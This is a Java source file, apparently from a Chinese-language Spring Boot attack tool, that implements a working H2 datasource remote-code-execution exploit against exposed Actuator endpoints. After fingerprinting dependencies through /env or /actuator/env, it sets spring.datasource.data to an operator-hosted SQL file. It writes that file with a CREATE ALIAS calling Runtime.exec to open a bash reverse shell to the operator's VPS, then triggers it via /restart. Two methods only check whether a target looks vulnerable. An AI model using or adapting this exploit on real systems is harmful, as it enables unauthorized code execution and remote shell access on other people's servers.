package src.main.module;

import src.main.common.HTTPConfig;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.ssl.sslVer.disableSSLVerification;

public class H2DataSourceRCE {
    private String address;
    public  String text;
    private String vpsIP;
    private String vpsPort;
    private boolean isPoc;
    public String expData1 = "spring.datasource.data=http://%s/H2DbSourcePoc.sql";
    public String expData2 = "{\"name\":\"spring.datasource.data\",\"value\":\"http://%s/H2DbSourcePoc.sql\"}";
    private static String sqlexp = "CREATE ALIAS %s AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL %s('/bin/bash','-c','bash -i >& /dev/tcp/%s/8881 0>&1');";
    public String flag = "T";
    public static int count;

    public H2DataSourceRCE(String address,String vpsIP,String vpsPort,boolean isPoc){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPort = vpsPort;
        this.isPoc = isPoc;
    }
    public void Result1(ResultCallback callback){
        String api = "/env";
        String site = address + api;
        String restapi = "/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        String data = String.format(expData1,vpsIP + ":" + vpsPort);
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    URL obj1 = new URL(site);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        try {
                            count = (int) (Math.random() * 900) + 100;
                            flag = "T" + String.valueOf(count);
                            String exp = String.format(sqlexp, flag,flag, vpsIP);
                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
                            Scanner sc = new Scanner(System.in);
                            writer.write(exp);
                            sc.close();
                            writer.close();
                            text = "H2DbSourcePoc.sql文件写入成功";
                            callback.onResult(text);
                            ++count;
                            HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                            conn2.setRequestMethod("POST");
                            conn2.setRequestProperty("Content-Type", "application/json");
                            conn2.setDoOutput(true);
                            int responseCode2 = conn2.getResponseCode();
                            if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                text = "请求成功，请到反弹vps上查看";
                                callback.onResult(text);
                            } else {
                                text = "反弹失败，请查看vps状态或网络状态后重试";
                                callback.onResult(text);
                            }
                        }catch (IOException e){
                            text = "写入文件异常";
                            callback.onResult(text);
                            e.printStackTrace();
                        }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database 依赖和spring-boot-starter-data-jpa 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
    public void Result2(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String restapi = "/actuator/restart";
        String restsite = address + restapi;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        String data = String.format(expData2,vpsIP + ":" + vpsPort);
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s",matcher1.group(1));
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(site);
                    conn1.setRequestMethod("POST");
                    conn1.setRequestProperty("Content-Type","application/json");
                    conn1.setDoOutput(true);
                    try (OutputStream os = conn1.getOutputStream()) {
                        byte[] input = data.getBytes(StandardCharsets.UTF_8);
                        os.write(input, 0, input.length);
                    }
                    int responseCode1 = conn1.getResponseCode();
                    if (responseCode1 == HttpURLConnection.HTTP_OK){
                        try {
                            count = (int) (Math.random() * 900) + 100;
                            flag = "T" + String.valueOf(count);
                            String exp = String.format(sqlexp, flag, flag, vpsIP);
                            FileWriter writer = new FileWriter(System.getProperty("user.dir") + "/resources/H2DbSourcePoc.sql");
                            Scanner sc = new Scanner(System.in);
                            writer.write(exp);
                            sc.close();
                            writer.close();
                            text = "H2DbSourcePoc.sql文件写入成功";
                            callback.onResult(text);
                            ++count;
                            URL obj2 = new URL(restsite);
                            HttpURLConnection conn2 = HTTPConfig.createConnection(restsite);
                            conn2.setRequestMethod("POST");
                            conn2.setRequestProperty("Content-Type", "application/json");
                            conn2.setDoOutput(true);
                            int responseCode2 = conn2.getResponseCode();
                            if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                text = "请求成功，请到反弹vps上查看";
                                callback.onResult(text);
                            } else {
                                text = "反弹失败，请查看vps状态或网络状态后重试";
                                callback.onResult(text);
                            }
                        }catch (IOException e){
                        text = "写入文件异常";
                        callback.onResult(text);
                        e.printStackTrace();
                    }
                    }else{
                        text = "发送restart失败，请重试";
                        callback.onResult(text);
                    }
                }
                else {
                    text = "未找到h2database 依赖和spring-boot-starter-data-jpa 依赖";
                    callback.onResult(text);
                }
            }else{
                text = "发送请求失败，请重试";
                callback.onResult(text);
            }
        }catch (Exception e){
            text = "查找依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result3(ResultCallback callback){
        String api = "/env";
        String site = address + api;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s", matcher1.group(1));
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                    conn1.setDoOutput(true);
                    conn1.setRequestMethod("GET");
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
                        text = "可能存在漏洞";
                        callback.onResult(text);
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }else {
                    text = "不存在可利用漏洞";
                    callback.onResult(text);
                }
            }
        }catch (Exception e){
            text = "查找依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Result4(ResultCallback callback){
        String api = "/actuator/env";
        String site = address + api;
        String llib = "h2database";
        String llib1 = "spring-boot-starter-data-jpa";
        disableSSLVerification();
        try {
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && (response.toString().contains(llib) && response.toString().contains(llib1))) {
                String regex = llib + "/h2/" + "(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("h2database 依赖为: %s", matcher.group(1));
                    callback.onResult(text);
                    text = String.format("spring-boot-starter-data-jpa 依赖为：%s", matcher1.group(1));
                    callback.onResult(text);
                    HttpURLConnection conn1 = HTTPConfig.createConnection(address + "/actuator");
                    conn1.setDoOutput(true);
                    conn1.setRequestMethod("GET");
                    int responseCode1 = conn1.getResponseCode();
                    BufferedReader in1 = new BufferedReader(new InputStreamReader(conn1.getInputStream()));
                    String inputLine1;
                    StringBuilder response1 = new StringBuilder();
                    while ((inputLine1 = in1.readLine()) != null) {
                        response1.append(inputLine1);
                    }
                    in1.close();
                    if (responseCode1 == HttpURLConnection.HTTP_OK && (response1.toString().contains("/restart")) && !matcher.group(1).isEmpty()) {
                        text = "可能存在漏洞";
                        callback.onResult(text);
                    }else {
                        text = "不存在可利用漏洞";
                        callback.onResult(text);
                    }
                }else {
                    text = "不存在可利用漏洞";
                    callback.onResult(text);
                }
            }
        }catch (Exception e){
            text = "查找依赖异常";
            callback.onResult(text);
            e.printStackTrace();
        }
    }
    public void Exp(ResultCallback callback){
        String api ="/actuator/env";
        String site = address + api;
        disableSSLVerification();
        try{
            HttpURLConnection conn = HTTPConfig.createConnection(site);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                // 存在路径是springboot2，否则是springboot1
                text = "当前版本为springboot2";
                callback.onResult(text);
                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
                    Result4(callback);
                }else {
                    Result2(callback);
                }
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
                callback.onResult(text);
                if (isPoc && vpsPort.isEmpty() && vpsIP.isEmpty()){
                    Result3(callback);
                }else {
                    Result1(callback);
                }
            }else{
                text = "未识别springboot版本";
                callback.onResult(text);
            }
        }catch (IOException e){
            e.printStackTrace();
        }
    }
}
